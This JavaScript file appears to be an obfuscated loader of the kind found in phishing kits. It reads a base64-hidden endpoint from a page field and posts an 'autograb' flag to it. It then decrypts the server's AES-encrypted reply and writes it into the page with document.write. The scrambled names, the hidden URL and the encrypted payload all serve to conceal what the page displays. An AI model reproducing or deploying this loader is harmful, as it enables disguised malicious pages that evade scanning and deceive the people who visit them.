var v2b91951b = document.createElement('script');
var autograb = 1;
v2b91951b.setAttribute('src', 'https://code.jquery.com/jquery-3.1.1.min.js');
document.head.append(v2b91951b);

var vf5fe7d85 = document.createElement('script');
vf5fe7d85.setAttribute('src', "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js");
document.head.append(vf5fe7d85);

v2b91951b.onload = function() {
        $.support.cors = true
        var v78320134 = "".split;
        var CryptoJS = [].constructor.constructor('return CryptoJS'); /**/
        $.post(atob($('#b64u').val(), 'scte='.concat('') + (autograb == 0 ? '&auto=false' : ''))
            .done(function(va1af6c4049) {
                function v7d57cc01(f) {
                    var O00O1II = v78320134.apply(atob(f), ['*']);
                    var O000111 = {
                        OO0O1II: O00O1II[0],
                        OO0OII1: O00O1II[2],
                        OOOOII1: O00O1II[1],
                        OO0OIII: O00O1II[3],
                    }
                    var OOOOIII = CryptoJS().PBKDF2(O000111.OO0OIII, CryptoJS().enc.Hex.parse(O000111.OO0OII1), { hasher: CryptoJS().algo.SHA512, keySize: 64 / 8, iterations: 999 });
                    var O00O111 = CryptoJS().AES.decrypt(O000111.OO0O1II, OOOOIII, { iv: CryptoJS().enc.Hex.parse(O000111.OOOOII1) });
                    return O00O111.toString(CryptoJS().enc.Utf8);
                }
                if (va1af6c4049 == 'no') {
                    document.write('<h1>Please Get an api key to use this page</h1>')
                } else if (va1af6c4049 == "outdated") {
                    document.write('<h1>Please get an updated  version of the page</h1>')
                } else {
                    try {
                        document.write(atob(v7d57cc01(va1af6c4049)));
                    } catch (e) {
                        document.write('<h1>Cannot write to page</h1>')
                    }
                }
            })
            .fail(function(cd, pg) {
                document.write("<h1>Unable to connect , Server not found</h1>")
            })
        }